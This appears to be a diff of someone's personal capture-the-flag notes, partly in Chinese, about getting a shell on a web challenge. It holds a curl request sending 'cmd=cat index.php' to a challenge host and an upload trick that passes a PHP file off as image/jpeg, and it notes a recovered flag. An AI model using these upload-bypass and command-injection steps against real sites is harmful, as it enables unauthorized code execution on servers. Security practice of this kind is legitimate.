@@ -1427,9 +1427,13 @@ curl -d "cmd=cat index.php" http://118.89.219.210:49166/index.php?file=upload/20
 
 
 ====================
+求getshell
 ====================
--F "uploadFile=@filename.pdf;type=image/jpeg" 
+尝试1：
+  上传php
+-F "uploadFile=@filename.php;type=image/jpeg" 
 
+尝试2：
+ 用 mycurl.py python脚本 
+ KEY{bb35dc123820e}
 
-
-D:\ctf>curl -i -v -H "Content-Type: multipart/form-data; boundary=----------0x15f0e7eb752" --data-binary @postdata.txt http://120.24.86.145:8002/web9/
